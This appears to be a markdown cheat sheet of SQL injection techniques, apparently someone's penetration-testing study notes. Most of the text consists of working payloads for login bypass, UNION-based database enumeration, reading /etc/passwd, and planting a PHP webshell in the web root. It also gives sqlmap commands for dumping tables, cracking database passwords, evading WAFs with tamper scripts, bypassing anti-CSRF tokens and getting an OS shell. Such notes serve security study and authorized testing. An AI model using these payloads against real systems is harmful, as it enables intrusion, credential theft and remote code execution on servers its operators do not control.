# error based 

- used to bypass auth

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

- OR based payloads

```sql
admin' or '1'='1
```

- commnet based 

```sql
admin'--
```

```sql
admin') --
```

- original sql

```sql
SELECT * FROM logins where (username='admin')
```

- to get the user with id 5

```sql
random' OR id = 5) --   
```

# Union based

- used to get unauth data
- first we need to get the data size

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- - <- breaks here means the query has 3 columns
```

- same with the UNION

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -    <- Correct here means the query has 3 columns
```


- we get the DBMS version

```sql
' UNION select 1,@@version,3,4-- -
```

- Other payloads :

```sql
SELECT @@version

SELECT POW(1,1)

SELECT SLEEP(5)
```

# INFORMATION_SCHEMA Database

- ti identify all the databases

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

- find the current database

```sql
cn' UNION select 1,database(),2,3-- -
```

- we find the table name 

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- find the columne 

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```


# Reading Files

- user enum 

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

- User Privileges

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'THE_USER"-- -
```

- to read data from files

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

- web root enum 

```sql
') UNION SELECT 1,2,3,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -
```
# Writing Files

- checking the `secure_file_priv` global variable.

```sql
' union SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" -- -
```

- writing files 

```sql
' union  SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt' -- -
```

- webshell

```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```


# sqlmap

- basic command for GET request 

```sh
sqlmap -u "http://www.example.com/vuln.php?id=1" --bach
```

- basic command for POST request 

```sh
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

- to use a request file 

```sh
 sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

- to add a cookie header

```sh
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

- random selection of a `User-agent`

```sh
sqlmap ... --random-agent
```

- testing the headers for the SQLi vulnerability

```sh
sqlmap ... --cookie="id=1*"
```

- modifing the method

```sh
sqlmap -u www.target.com --data='id=1' --method PUT
```

- to parse  errors 

```sh
sqlmap ... --parse-errors
```

- storing the trafic

```sh
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

- proxy usage

```sh
sqlmap ... --proxy
```

- using suffix and prifix

```sh
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

- Level : the depth 

```sh
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

- risk : risk to harm the system

```sh
sqlmap -u www.example.com/?id=1 -v 3 --risk=3
```

- to specify the union columns

```sh
sqlmap ... --union-cols=1-9 
```

- powerfull commands 

```sh
sqlmap -u ... --level=5 --risk=3 -T TABLE --no-cast --dump -D db
```

## enum techniques

- user enum 

```sh
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

- Conditional Enumeration

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```


-  DB Schema Enumeration

```sh
sqlmap -u "http://www.example.com/?id=1" --schema
```

-  Searching for Data

```sh 
sqlmap -u "http://www.example.com/?id=1" --search -T user -C pass
```

- DB Users Password Enumeration and Cracking

```sh
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```


## Advenced SQLMAP

- Anti-CSRF Token Bypass

```sh
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

-  Unique Value Bypass

```sh
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp 
```

-  Calculated Parameter Bypass `h=MD5(id)`

```sh
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

## Tamper Scripts

```sh 
sqlmap ... --tamper
```

|**Tamper-Script**|**Description**|
|---|---|
|`0eunion`|Replaces instances of UNION with e0UNION|
|`base64encode`|Base64-encodes all characters in a given payload|
|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
|`space2comment`|Replaces space character ( ) with comments `/|
|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
|`space2plus`|Replaces space character ( ) with plus (`+`)|
|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|

-  Miscellaneous Bypasses

  ```sh 
  sqlmap ... --chunked
  ```


## OS Exploitation

- file read 

```sh
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

- file write 

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```sh
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

- getting a shell with `xp_cmdshell`

```sh
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
